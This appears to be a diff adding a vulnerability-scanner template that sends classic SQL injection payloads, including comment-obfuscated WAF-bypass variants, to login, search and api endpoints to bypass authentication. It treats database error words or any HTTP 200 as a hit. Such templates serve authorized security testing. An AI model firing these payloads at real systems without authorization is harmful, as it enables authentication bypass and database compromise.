@@ -1,0 +1,48 @@
+id: sqli-p1
+
+info:
+  name: SQL Injection - Basic OR Bypass
+  author: custom
+  severity: high
+  description: Basic SQL injection payloads using OR conditions to bypass authentication
+  tags: sqli,waf-bypass,injection
+
+http:
+  - raw:
+      - |
+        GET /{{path}}?id={{payload}} HTTP/1.1
+        Host: {{Hostname}}
+        
+      - |
+        POST /{{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        id={{payload}}
+
+    payloads:
+      payload:
+        - "' or 1=1 -- -"
+        - "' OR '1'='1"
+        - '" OR "1"="1'
+        - "' OR 1=1/*"
+        - "'/**/OR/**/1=1"
+      path:
+        - "login"
+        - "search"
+        - "api"
+
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "mysql"
+          - "syntax error"
+          - "SQL"
+          - "database"
+        condition: or
+        
+      - type: status
+        status:
+          - 200
